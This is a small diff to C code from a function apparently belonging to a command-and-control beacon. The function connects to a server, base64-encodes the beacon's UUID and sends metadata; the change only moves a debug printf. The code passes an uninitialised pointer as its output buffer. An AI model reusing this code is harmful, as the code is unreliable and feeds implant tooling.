@@ -64,9 +64,9 @@ void beacon_connect_to_server(char IP[16], int PORT){
     // base64 encode the UUID of the beacon
     char b64size[1024];
     DWORD strcount = _countof(b64size);
-    printf("\nBASE64\n");
     char *UUID_BUFFER;
     BOOL res = CryptBinaryToStringA(sendbuf, 128, 1, UUID_BUFFER, &strcount);
+    printf("\nBASE64\n");
 
     //// Send metadata
     printf("\nSENDBUF\n");
